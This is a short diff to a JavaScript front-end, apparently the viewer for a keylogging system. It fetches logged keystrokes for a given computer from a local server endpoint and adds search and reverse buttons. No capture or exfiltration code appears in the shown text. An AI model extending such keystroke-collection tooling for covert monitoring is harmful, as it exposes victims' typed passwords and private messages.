@@ -18,8 +18,10 @@ h1.textContent = computer
 
 // בקשת מידע מהשרת - כל המידע הקיים על המחשב שנשלח כפרמטר 
 const request = () => {
-
-
+    const text = document.getElementById("text").value.trim()
+    if (text != ""){
+        return;
+    }
     fetch(`http://127.0.0.1:5000/api/get_keystrokes?computer=${computer}`).then(
         response => response.json().then(
             object => {
@@ -126,10 +128,17 @@ const reverse_data = () => {
 }
 
 request()
+
+
 const link_search = document.getElementById("mylink")
 link_search.addEventListener("click", () => {
     event.preventDefault();
-    search()
-})
+    request();
+    search();
+    })
 
-
+const link_reverse = document.getElementById("reverse")
+link_reverse.addEventListener("click", () => {
+    event.preventDefault();
+    reverse_data()
+    })
